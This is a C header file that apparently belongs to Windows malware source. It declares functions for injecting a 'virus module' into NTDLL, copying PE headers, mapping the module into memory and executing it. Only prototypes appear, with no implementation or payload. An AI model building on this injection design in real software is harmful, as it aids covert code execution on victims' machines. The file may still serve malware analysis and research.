#ifndef __CODEBLOCK_H__
#define __CODEBLOCK_H__

#include "StdAfx.h"
#include "define.h"

#include "AssemblyBlock2.h"

INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader);
INT32 BLOCK4_ExecuteLibrary(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader);
void BLOCK4_CopyPEHeaderInfo(PGENERAL_INFO_BLOCK sInfoBlock, PIMAGE_NT_HEADERS pImageNT, INT32 iVirusModuleSize);
NTSTATUS BLOCK4_AlignAddresses(PIMAGE_DOS_HEADER *pImageDOS);
void BLOCK4_memcpy(void *pDestination, const void *pSource, unsigned int iSize);
void BLOCK4_CopyDataIntoMapView(PVOID pVirusModule, PIMAGE_NT_HEADERS pImageNT, LPVOID pMapViewOfFile);
INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader, PHARDCODED_ADDRESSES pHardAddrs);
INT32 BLOCK4_LoadVirusModuleInfo(PHARDCODED_ADDRESSES pHardAddrs, GENERAL_INFO_BLOCK *sInfoBlock, PVOID pVirusModule, INT32 iVirusModuleSize);
void BLOCK4_END(void);

#endif